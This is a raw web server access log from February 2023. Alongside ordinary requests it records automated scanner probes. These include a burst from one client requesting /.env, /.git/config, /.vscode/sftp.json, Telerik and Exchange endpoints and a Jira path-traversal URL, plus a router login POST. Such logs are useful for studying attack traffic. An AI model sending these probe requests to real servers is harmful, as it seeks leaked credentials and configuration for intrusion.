183.136.225.32 - - [06/Feb/2023:18:19:56 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [06/Feb/2023:18:25:37 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [06/Feb/2023:18:25:58 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
143.110.222.166 - - [06/Feb/2023:18:26:12 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.219 - - [06/Feb/2023:18:28:59 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
128.1.248.26 - - [06/Feb/2023:18:48:28 -0600] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
2001:470:1:c84::19 - - [06/Feb/2023:18:59:02 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
194.87.151.116 - - [06/Feb/2023:18:59:48 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
2001:470:1:c84::19 - - [06/Feb/2023:19:08:35 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
2001:470:1:c84::167 - - [06/Feb/2023:19:08:41 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "\x16\x03\x01" 400 226 "-" "-"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "HELP" 400 226 "-" "-"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 316 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA616715) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3267.98 Mobile Safari/537.3"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /info.php HTTP/1.1" 301 249 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /.DS_Store HTTP/1.1" 301 250 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /server-status HTTP/1.1" 301 254 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /.vscode/sftp.json HTTP/1.1" 301 258 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 301 266 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /s/7393e2031323e2539313e2439313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 301 341 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /telescope/requests HTTP/1.1" 301 259 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /.git/config HTTP/1.1" 301 252 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:07 -0600] "GET /debug/default/view?panel=config HTTP/1.1" 301 272 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:08 -0600] "GET /about HTTP/1.1" 301 246 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:08 -0600] "GET /login.action HTTP/1.1" 301 253 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:08 -0600] "GET /config.json HTTP/1.1" 301 252 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:08 -0600] "GET /v2/_catalog HTTP/1.1" 301 252 "-" "Go-http-client/1.1"
139.59.138.104 - - [06/Feb/2023:19:23:08 -0600] "GET /api/search?folderIds=0 HTTP/1.1" 301 263 "-" "Go-http-client/1.1"
91.243.38.232 - - [06/Feb/2023:19:25:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
